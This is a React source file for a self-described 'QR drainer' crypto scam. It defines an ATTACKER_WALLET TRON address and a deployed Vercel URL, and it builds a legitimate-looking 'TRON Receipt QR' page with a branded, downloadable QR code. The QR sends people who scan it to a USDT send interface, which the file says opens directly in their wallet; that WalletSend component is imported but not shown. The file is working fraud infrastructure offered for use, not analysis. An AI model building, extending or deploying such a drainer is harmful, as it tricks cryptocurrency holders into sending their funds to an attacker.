import React, { useRef } from "react";
import { HashRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
import { QRCodeSVG } from "qrcode.react";
import WalletSend from "./WalletSend";

// ==========================================
// CONFIGURATION
// ==========================================
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
const PRODUCTION_URL  = "https://qr-drainer-one.vercel.app";

// QR points DIRECTLY to the wallet page (no home hop)
const QR_VALUE = `${PRODUCTION_URL}/#/wallet`;

const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

// ==========================================
// HOME PAGE (Presenter View — shows QR)
// ==========================================
function HomePage() {
  const navigate = useNavigate();
  const qrBoxRef = useRef(null);

  const handleSaveQR = () => {
    const svg = qrBoxRef.current?.querySelector("svg");
    if (!svg) return;

    const size = 400;
    const canvas = document.createElement("canvas");
    canvas.width = size;
    canvas.height = size;
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, size, size);

    const img = new Image();
    const svgData = new XMLSerializer().serializeToString(svg);
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);

      // White circle behind logo
      const ls = size * 0.22;
      const lp = (size - ls) / 2;
      ctx.beginPath();
      ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#ffffff";
      ctx.fill();

      // TRON logo
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        const link = document.createElement("a");
        link.download = "TRON-USDT-QR.png";
        link.href = canvas.toDataURL("image/png");
        link.click();
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src =
      "data:image/svg+xml;base64," +
      btoa(unescape(encodeURIComponent(svgData)));
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(ATTACKER_WALLET);
  };

  return (
    <div style={{
      background: "#0b0e11",
      minHeight: "100vh",
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      color: "#eaecef",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      padding: 20
    }}>
      {/* Card */}
      <div style={{
        background: "#1e2329",
        borderRadius: 20,
        padding: 32,
        width: "100%",
        maxWidth: 380,
        border: "1px solid #2b3139",
        boxShadow: "0 20px 60px rgba(0,0,0,0.5)"
      }}>
        {/* Title */}
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <h1 style={{ margin: "0 0 6px", fontSize: 20, fontWeight: 700, color: "#fff" }}>
            TRON Receipt QR
          </h1>
          <p style={{ margin: 0, fontSize: 12, color: "#848e9c" }}>
            Presenter view — scan with any TRON wallet
          </p>
        </div>

        {/* QR Code */}
        <div
          ref={qrBoxRef}
          style={{
            background: "#ffffff",
            borderRadius: 16,
            padding: 20,
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            marginBottom: 20
          }}
        >
          <QRCodeSVG
            value={QR_VALUE}
            size={220}
            level="H"
            includeMargin={false}
            imageSettings={{
              src: TRON_LOGO_B64,
              height: 48,
              width: 48,
              excavate: true
            }}
          />
        </div>

        {/* Recipient Address */}
        <div style={{
          background: "#0b0e11",
          border: "1px solid #2b3139",
          borderRadius: 10,
          padding: "12px 14px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          marginBottom: 16
        }}>
          <span style={{
            fontFamily: "monospace",
            fontSize: 12,
            color: "#eaecef",
            overflow: "hidden",
            textOverflow: "ellipsis",
            whiteSpace: "nowrap",
            maxWidth: "70%"
          }}>
            {ATTACKER_WALLET}
          </span>
          <button
            onClick={handleCopyAddress}
            style={{
              background: "#f0b90b",
              color: "#0b0e11",
              border: "none",
              borderRadius: 6,
              padding: "6px 12px",
              fontSize: 12,
              fontWeight: 700,
              cursor: "pointer"
            }}
          >
            Copy
          </button>
        </div>

        {/* Action Buttons */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 12 }}>
          <button
            onClick={handleSaveQR}
            style={{
              background: "#2b3139",
              border: "1px solid #3d4a5c",
              borderRadius: 10,
              padding: 12,
              color: "#eaecef",
              fontSize: 13,
              fontWeight: 600,
              cursor: "pointer"
            }}
          >
            Save QR
          </button>
          <button
            onClick={() => navigate("/wallet")}
            style={{
              background: "#2b3139",
              border: "1px solid #3d4a5c",
              borderRadius: 10,
              padding: 12,
              color: "#eaecef",
              fontSize: 13,
              fontWeight: 600,
              cursor: "pointer"
            }}
          >
            Preview Page
          </button>
        </div>

        {/* Note */}
        <div style={{
          background: "rgba(240,185,11,0.08)",
          border: "1px solid rgba(240,185,11,0.2)",
          borderRadius: 8,
          padding: "10px 12px",
          fontSize: 11,
          color: "#f0b90b",
          lineHeight: 1.5,
          textAlign: "center"
        }}>
          Scanning opens the USDT send interface directly inside the wallet.
        </div>
      </div>
    </div>
  );
}

// ==========================================
// APP ROOT — Router with 2 routes
// ==========================================
export default function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/wallet" element={<WalletSend />} />
      </Routes>
    </Router>
  );
}